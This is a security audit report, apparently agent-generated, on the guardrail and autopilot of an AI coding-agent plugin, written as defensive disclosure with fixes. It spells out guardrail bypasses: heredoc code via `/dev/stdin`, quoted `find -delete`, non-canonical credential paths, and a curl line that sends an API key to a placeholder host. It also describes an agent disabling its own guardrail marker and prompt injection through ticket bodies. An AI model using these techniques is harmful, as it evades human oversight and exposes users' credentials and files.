# Security report — audit-2026-10-23
Verdict: FAIL — one confirmed High guardrail bypass (interpreter code via `/dev/stdin` and a heredoc, `hooks/lib/qa-shell-writes.mjs:460`) defeats the read-only hunt profile, and the dependencies lane recorded three high runtime CVEs in `toml` 4.3.0 (DoS-class, unreachable from repo code, in untracked `.opencode` state).

| Ticket or audit | audit-2026-10-23 |
|---|---|
| Date (UTC) | 2026-10-23 09:05 |
| Scope | the whole tree (full audit) |
| Repositories | ultrapowers: dev at 993f2d4, 2980 files, 27 tree groups |
| Lanes run | dependencies, code (8 hunters), secrets-supply-chain, ai-surface, osint |

## Summary

One repository, full-tree audit. 12 hunters and 16 verifiers ran, all on the sanctioned models (hunters on a mid-tier model, verifiers on the most capable). Counts after verification and dedup:

| Severity | Raised | Confirmed | Plausible | Rejected / discarded | Unverified |
|---|---|---|---|---|---|
| High | 1 | 1 | 0 | 0 | 0 |
| Medium | 15 | 11 | 2 | 2 (→ discarded) | 0 |
| Low | 11 | n/a (Lows are not verified by contract) | | | |
| CVEs | 3 advisories | high x3 (runtime, DoS-class) | | | |

- **What decides the verdict:** FAIL on two independent grounds. (1) A confirmed **High**: an interpreter or shell handed its code through `/dev/stdin` (or `/dev/fd/0`, `/proc/self/fd/0`) and a heredoc is allowed by every guardrail profile, including the hunt, which is meant to run no program off its list and reach no network. (2) Three **high** CVEs in a runtime dependency (`toml` 4.3.0). The deciding finding named in the verdict line is the High guardrail bypass; the CVEs are a secondary FAIL ground, heavily qualified below.
- **The CVEs are weak as a FAIL ground, and the owner should weigh them as such.** All three `toml` advisories are denial-of-service / resource-exhaustion class (the hunt excludes that class from *findings*, but the verdict rule still fails a run on a high runtime CVE). No repository file imports `toml`, `effect` or `@opencode-ai/plugin`; `.opencode/plugins/ultrapowers.js` states it needs none of them. The chain `@opencode-ai/plugin 1.15.13 -> effect 4.0.0-beta.66 -> toml 4.3.0` lives only in `.opencode/package.json` and `.opencode/package-lock.json`, both **gitignored and untracked** — local state OpenCode generates in its config folder, not part of the shipped plugin (the plugin keeps zero runtime dependencies by design). The tool reports no patched `toml`; its only `fixAvailable` is a semver-major downgrade of `@opencode-ai/plugin`.
- **The substance of this audit is the guardrail and the autopilot.** The plugin's own PreToolUse guardrail (`hooks/qa-guardrail`, `hooks/lib/qa-shell-writes.mjs`) and the unattended autopilot stages are the security-critical surface, and that is where every confirmed finding sits. The guardrail is a text-and-tokenizer allow/deny layer, and its own header says it is not a sandbox; the confirmed findings are the cases where a shape the hunt or autopilot profile is meant to refuse gets through.
- **Verification:** 16 verifiers were dispatched for the 1 High and 15 Medium findings, one each, on the most capable model. 12 came back confirmed, 2 plausible, 2 rejected. The 2 rejected (the build/test allow-list, and the team-memory write) move to Discarded leads with the verifier's reason. No verifier failed or was skipped.
- **Deduplication:** the autopilot findings overlap across the ai-surface and code lanes; they are listed once each. The `${NAME:-}` tokenizer gap is the shared root cause of two confirmed findings with different sinks — the curl egress (ai-surface) and the credential read-out (code lane); both are kept because the sinks differ (network vs transcript), and cross-referenced. The stage-environment script-file route is the enabler step inside the approval-binding and autopilot git-path findings; all three are kept because their sinks differ.
- **Process notes (for the owner).** Two items of method to be aware of: (1) a hunter demonstrated the `git blame -S` read primitive by running it against a harmless Windows system file; the contract says an exploit is described, never run. No credential was read, and the verifier did not reproduce it, but it is recorded here. The same command succeeding during the hunt is itself a data point — `git blame` is on the read-only set and its `-S`/`--ignore-revs-file` file-read side effect is not caught. (2) Several hunter and verifier outputs were flagged by the harness as matching instruction-shaped patterns (settings-json, bypass-permissions); in every case that was a hunter quoting the template's permission lists or an adapter's flags as part of a finding. No instruction in any subagent output was followed.
- **Dependabot does not cover the toml CVEs.** The OSINT lane found the Dependabot and secret-scanning feeds on and empty, but Dependabot cannot see `.opencode/package.json` because it is untracked, so its empty list says nothing about the three `toml` advisories.

Guardrail: active (the hunt profile denied a `for`-loop heartbeat, `npm view`, `npm ls toml`, and numerous hunter/verifier commands — a `for` loop, `base64`, `git check-ignore`, globs over key-material names, PowerShell, `node -p`, `printenv`; none was worked around).

## Repositories

### ultrapowers

### CVEs

| Package | Version | Advisory | Severity | Fixed in | Runtime |
|---|---|---|---|---|---|
| toml | 4.3.0 | GHSA-4qx8-w7c3-pj3p | high | none stated (affected <=5.0.0) | runtime (untracked `.opencode` local state; DoS-class; not imported by repo code) |
| toml | 4.3.0 | GHSA-9j65-hcg3-gc64 | high | none stated (affected <=5.0.0) | runtime (as above) |
| toml | 4.3.0 | GHSA-9qmh-m7c6-f92p | high | none stated (affected <=5.0.0) | runtime (as above) |

Chain: `@opencode-ai/plugin 1.15.13 -> effect 4.0.0-beta.66 -> toml 4.3.0`. npm audit on `tests/brainstorm-server` is clean (exit 0, 0 vulnerabilities). Root `package.json` declares no dependencies.

### Findings

#### High

1. **Interpreter or shell given its code through `/dev/stdin` and a heredoc passes every guardrail profile** `hooks/lib/qa-shell-writes.mjs:460` — guardrail bypass: code execution, confidence 8, verification **confirmed** (8)
   - Attack path: `tool_input.command` → the bash text rule (`hooks/qa-guardrail:936`) matches only `-c/-e/-p/--eval/-` → `analyze`/`tokenize` skips the `<<` heredoc body → `interpreterKind('node')` → `inlineInterpreterReason` returns `''` for `/dev/stdin` (only bare `-` is treated as stdin) → `huntProgramWhy` returns `''` because the script path is outside the project → allowed; the shell then runs the heredoc body as code.
   - Exploit (described, never run): under a hunt marker a hijacked agent sends `node /dev/stdin <<'EOF'` with JavaScript that reads `process.env` or opens a socket, then `EOF`; the hunt is meant to run no program off its list and reach no network. `bash /dev/stdin <<'EOF'` does the same under QA and autopilot. Linux/macOS.
   - Mitigation examined: `STDIN_WHY`, the bash text rule and the hunt first-word rule all treat a path-named stdin as a normal script file; no fixture covers `/dev/stdin`. In QA and autopilot the gain over the documented script-file limit is small; in the hunt, where writing-and-running a script is otherwise closed, it is the gap that lets the agent run code it chose.
   - Fix: refuse a script operand resolving to `/dev/stdin`, `/dev/fd/*`, `/proc/*/fd/*` or any non-regular file, and refuse `<`, `<<`, `<<<` feeding an interpreter; in the hunt require the script realpath to be a regular file of the plugin's own preflight.

#### Medium

1. **`find -delete` refused by a raw-text rule only; quoting the program name skips it** `hooks/lib/qa-shell-writes.mjs:2009` — guardrail bypass: destructive write, confidence 8, **confirmed** (9). The only rule is the grep at `qa-guardrail:911`; `'find'`, `"find"`, `fi\nd` and `-de''lete` slip past, the tokenizer normalises to `find` (on `HUNT_PROGRAMS`), and the analyzer `find` branch never checks `-delete`. Deletes the tree in a read-only profile. Fix: handle `-delete` in the analyzer; run the program-name rules on normalised words.

2. **Key-file and `/proc/*/environ` rules are text regexes; `//`, `/./` and in-repo symlinks pass** `hooks/qa-guardrail:944` — guardrail bypass: key material read, confidence 8, **confirmed** (9). `~/.config//gh/hosts.yml`, `/proc/self/./environ` and a committed symlink reach `cat`/`tr` (allowed), while the file tools resolve and deny the same paths. Fix: canonicalise every path-like word before `KEY_RE` and the environ test, in both the bash rules and `checkAlias`.

3. **Credential variables can still be printed: `${GH_TOKEN:-}`, `declare -p NAME`, `awk ENVIRON`** `hooks/lib/qa-shell-writes.mjs:91` — guardrail bypass: credential read-out, confidence 8, **confirmed** (8). `readVar` turns `${NAME:-x}` into a nameless dynamic part; `declare -p NAME` returns early in QA/autopilot; no rule refuses `awk ENVIRON` in any profile. Two forms hold in the hunt, all three in QA/autopilot. Same tokenizer gap as Medium 8 (curl egress). Fix: parse `${NAME...}` by its leading identifier; treat `declare/typeset -p NAME` as an env read; refuse `ENVIRON` in `awk`.

4. **Autopilot git sub-commands (`rm`, `mv`, `--output`) are exempt from the protected-path rules** `hooks/lib/qa-shell-writes.mjs:1905` — guardrail bypass: protected-path write, confidence 8, **confirmed** (8). In the autopilot profile every allowed git sub-command returns before `checkTarget`, so `git rm .github/workflows/ci.yml`, `git mv src/x .claude/settings.json` and `git log --output=<path>` write or delete protected files; the engine's end/pr steps check only repo name and branch. The Claude Code `git log/diff/show *--ou*` deny is Claude-only and misses `rm`/`mv`. Fix: run `checkTarget` on every git path operand and `--output` in the autopilot branch.

5. **The QA or hunt agent can switch the guardrail off with one allowed call** `hooks/qa-guardrail:901` — guardrail bypass: inert path controlled by the guarded agent, confidence 7, **confirmed** (8). A sole `rm -f .ultrapowers/<own marker>` from any agent in the session, at any time, is allowed; every later call is then inert. Contradicts the hunt design's stated claim that the hook holds whatever an injected hunter decides; `pressure-results.md` already concedes only wording protects the marker. Autopilot is excluded (its marker is protected and `ULTRAPOWERS_AUTOPILOT_INSIDE` keeps headless stages guarded). After removal, Claude Code default mode still prompts for push/tracker writes, but the scaffolded allow-list runs `npm test`/`pytest`/`cargo test` unprompted. Fix: end the run from a step the model cannot call, or keep a sidecar marker the agent cannot remove.

6. **Unattended stages inherit the full environment and run bypass-permissions under a guardrail that does not see script files** `skills/autopilot/scripts/autopilot.mjs:1101` — tool misuse, confidence 8, **confirmed** (8). A stage writes `tmp/x.mjs` (allowed anywhere in the workspace) and runs `node tmp/x.mjs` (the analyzer returns `''` for a script operand); the script reads `ODOO_API_KEY` and every key `loadSecretsFile` pulled from `.agents/mcp-secrets.env`, and opens connections no hook rule sees, with no OS sandbox. `docs/autopilot-watcher.md:57,77` discloses this, which is a disclosure, not a control. Fix: pass an allow-listed environment and run stages in an OS sandbox/container with limited network.

7. **Approval binding and PR targets are trusted from `autopilot.json`, which a stage can write** `skills/autopilot/scripts/autopilot.mjs:222` — authorization bypass (defense in depth), confidence 6, **confirmed** (8). A stage overwrites `tasks/<ID>/autopilot.json` via the script-file route or `git add` + `git mv -f` (operands the autopilot git branch never checks); nothing compares it with an engine-owned or committed copy, so a forged `docsTip` makes an old approval bless a changed plan, or a forged `prUrl` makes the engine's token comment on a chosen PR. The engine never merges, so impact needs a human to act on the opened PR/comment. Fix: keep the approval/packet binding in a signed, engine-owned file outside the stage-writable tree; validate PR URLs against the remote.

8. **Autopilot guardrail allows a curl GET with an indirected `$VAR` when `qa.hosts.allowed` is empty** `hooks/qa-guardrail:980` — tool misuse, confidence 8, **confirmed** (7). The literal `$ODOO_API_KEY` form is already refused (correcting the hunter), but `y=${ODOO_API_KEY:-}; curl https://host/k/$y` or a `declare -n` reference hides the name, and with `qa.hosts.allowed` and `qa.urls` empty (the scaffold default and this repo's config) no shell host check runs; `curl -H "X: $y" ...` works too. Shared root cause with Medium 3. Fix: treat empty `qa.hosts.allowed` as deny-all for `curl`/`wget`/`iwr` in the autopilot profile (matching the existing URL-tool rule), and scrub the stage environment.

9. **The ready label authenticates the labeller, not the ticket body** `skills/new-task/scripts/fetch-ticket.mjs:410` — prompt injection, confidence 7, **confirmed** (8). The body is fetched live at scaffold with no author check and no comparison against an edit time or hash (`updatedAt` is never used), and the author can edit it after the label, or hide instructions in an HTML comment the maintainer does not see; scaffold/spec/plan then run unattended with a bypass-permissions harness. The only control is prompt-level. What a steered stage can then do is Medium 6/8. Fix: bind the label to the content (record `updatedAt` or a body hash; re-require the label on an edit), or require the issue author to hold write access.

10. **Windows: bare tool names resolve in the checked-out repository first** `skills/autopilot/scripts/autopilot.mjs:1163` — untrusted search path, confidence 7, **confirmed** (7). The engine and preflight scripts start `git`, `bash`, `gh`, `glab`, `claude`, `codex` by bare name with `cwd` at or under the project root; on Windows libuv searches the child cwd before PATH. A checkout that commits `git.exe` or `claude.exe` at its root runs it on the first ultrapowers command, inheriting the watcher's tokens. The only fix since prior audit item 16 covers the hunt preflight's audit tools alone. Fix: resolve every tool to an absolute path from absolute PATH entries only, in a shared module.

11. **MCP write-deny is a name list, isolation is claude-code only, Antigravity calls lose their tool name** `hooks/qa-guardrail:620` — MCP servers, confidence 6, **plausible** (7). A path-less MCP call reaches `exit 0`; `--strict-mcp-config` is applied for claude-code only; the watcher refuses only devin; `guardrail-cli.mjs` maps Antigravity's `call_mcp_tool` to a constant that normalises to `tool` and skips even the Odoo/tracker denials. Unseen: which MCP servers a watcher host's non-claude-code harness loads, and Antigravity's real event shape (plausible, not confirmed). This repo's own harness is claude-code, which is isolated.

12. **Shipped `.claude/settings.json` allows `git blame`, whose `-S`/`--ignore-revs-file` read any file** `templates/.claude/settings.json.tmpl:15` — permission policy bypass (deny-list gap), confidence 8, **plausible** (8). The allow-list has `Bash(git blame:*)`; the only blame deny is `--contents`; the Read denies apply to the Read tool, not to git. Inside a QA/hunt/autopilot run the line-944 rule blocks literal credential paths (but not the non-canonical spellings of Medium 2); outside a run the guardrail is inert. The unseen step is Claude Code's runtime prefix matching of `git blame -S <path>` and whether a sandbox is on — hence plausible. Fix: drop `Bash(git blame:*)` or deny the `-S`/`--ignore-revs-file` forms; add an init-suite test probing the deny list for read-primitive options of every allowed git subcommand.

#### Low

(Not verified by contract; hardening.)

1. **`.agents/ultrapowers.json` is read from the stage-writable tree and not snapshotted** `skills/autopilot/scripts/autopilot.mjs:134` — a stage that reached it could repoint the Odoo `url` or set mode `full`. The guardrail protects it today.
2. **Engine git config pins are incomplete** `skills/autopilot/scripts/repos.mjs:55` — `credential.helper`, `core.askPass`, `gpg.program`, `url.*.insteadOf`, repo-local `filter`/`textconv` keys are not pinned.
3. **The headless stage environment is a deny-list of named tokens** `skills/autopilot/scripts/autopilot.mjs:1100` — a weaker Low restatement of Medium 6; build the stage env from an allow-list.
4. **Option injection through a configured branch name** `skills/autopilot/scripts/repos.mjs:99` — `autopilot.baseBranch`/`defaultBranch` from the marker reach git as a possible `--upload-pack`/`--output` option. Validate with `git check-ref-format`.
5. **Odoo `mcpUrl` may be plain http while the generated MCP entry sends `ODOO_API_KEY`** `skills/new-task/scripts/ticket-sources.mjs:73` — unchanged since the previous audit.
6. **Predictable `/tmp` session directory holds the session key** `skills/brainstorming/scripts/start-server.sh:114` — use `mktemp -d`.
7. **Antigravity guardrail hook registered with a cwd-relative script path** `hooks.json:10` — if Antigravity runs it from the workspace, a cloned repo's own file runs or the guardrail fails open. Behaviour unconfirmed.
8. **Scaffold does not gitignore `.env`/`.env.local`; secret-read deny lists differ between harnesses** `templates/_blocks/gitignore.tmpl:9` — add `.env`, `.env.*` (with `!.env.example`); `git show *:*/.env*` slips past the deny.
9. **Cursor deny-list template omits SSH, AWS and several `.env` variants the Claude template denies** `templates/.cursor/cli.json.tmpl:3` — surface-parity gap (overlaps Low 8); add the missing `Read(...)` denies and a parity test.
10. **Gitleaks Docker fallback pinned by mutable tag, not digest** `.githooks/pre-commit:26` and `templates/.githooks/pre-commit.tmpl` — pin to `@sha256:<digest>`, consider `--network none`.
11. **Scaffolded `.mcp.json` ships remote unauthenticated MCP servers without pinning, snapshotted into every stage** `templates/.mcp.json:21` — leave the remote documentation servers out of the autopilot snapshot.

## Skipped lanes

None skipped. All five lanes ran. Within lanes: the OSINT lane's `osv-scanner` step did not run (tool absent) — recorded, not a lane skip. The dependencies lane did not run `pip-audit`/`cargo-audit`/`dotnet`/`osv-scanner` (absent, or no manifest of that ecosystem in scope); the root `package.json` was not run through `npm audit` (no dependencies, no lockfile).

## Discarded leads (2 verifier rejections, plus the hunters' own below-floor leads)

- **Scaffolded settings pre-approve build/test commands** — rejected (confidence 8 verdict): the autopilot never checks out a third-party branch (only its own `<ID>-*` branches from the team's base) and runs bypass-permissions, so the allow-list is never consulted there; in the interactive path the author of the hostile tree also controls the committed `.claude/settings.json`, and running the project's own suite is the disclosed use `init` asks the developer to approve.
- **An autopilot stage can write the team-memory store and nested instruction files** — rejected (confidence 8 verdict): the write gap is real but deliberate — commit `12e150f` and `RELEASE-NOTES.md:179` reversed this exact hardening because such edits show in the PR diff, and persistence needs a human merge (the engine never merges; `autopilot-watcher.md:67` requires a reviewed merge).
- Below-floor hunter leads (not raised): the pre-commit fail-open with a warning; unauthenticated third-party HTTP MCP servers as a pure prompt-injection path; the `.gitleaks.toml` unanchored allow-list regexes (match only `${VAR}` shapes); the brainstorm server (auth, Origin, files route, bind address, XSS all hold); the quadratic-tokenizer timeout (resource exhaustion); and the per-lane leads recorded in `security-findings.json`.

## Files read (per lane)

- dependencies: 6 (three manifests, two lockfiles, the OpenCode injector)
- code: group-by-group whole-file reads across `.agents` through `(root files)`; the heart was `hooks/` (whole: `qa-guardrail`, `qa-shell-writes.mjs`, `guard-paths.mjs`, the bridges and registrations), the autopilot and task scripts under `skills/*/scripts/`, and the `templates/` payload
- secrets-supply-chain: manifests, lockfiles, CI, pre-commit hooks, `.gitleaks.toml`, the `templates/` config payload, `.agents/mcp-secrets.env.example`, plus whole-tree pattern searches and 638 commits of history
- ai-surface: the autopilot engine and prompts, `fetch-ticket.mjs`, `post-review.mjs`, the session-start and team-memory hooks, the guardrail, `templates/.mcp.json` and the permission settings
- osint: three manifests; `gh api` for the repo record, Dependabot and secret-scanning feeds, and seven public-code identifier searches

The full per-file list is in `security-findings.json`.

## Tools used

| Tool | Version | Command | Exit |
|---|---|---|---|
| npm | 11.21.1 | `npm audit --package-lock-only --json --prefix S:/ultrapowers/.opencode` | 1 (advisories; a valid report) |
| npm | 11.21.1 | `npm audit --package-lock-only --json --prefix S:/ultrapowers/tests/brainstorm-server` | 0 (0 vulnerabilities) |
| node | v26.12.1 | `node --version` | 0 |
| npm | 11.21.1 | `npm --version` | 0 |
| git | n/a | `git remote get-url origin` | 0 |
| gh | 2.103.0 | `gh api repos/raoofaltaher/ultrapowers` | 0 |
| gh | 2.103.0 | `gh api repos/raoofaltaher/ultrapowers/dependabot/alerts` | 0 (empty; does not cover untracked `.opencode`) |
| gh | 2.103.0 | `gh api repos/raoofaltaher/ultrapowers/secret-scanning/alerts` | 0 (empty) |
| gh | 2.103.0 | `gh search code "<identifier>"` (7 queries, one per call) | 0 |

Denied by the hunt guardrail (recorded, not worked around): `npm view` (not on the list), `npm ls toml` (argument not allowed), a `for`-loop heartbeat, and — across hunters and verifiers — `base64`, `git check-ignore`, globs over key-material names, PowerShell, `node -p`, `printenv`, and output redirects.
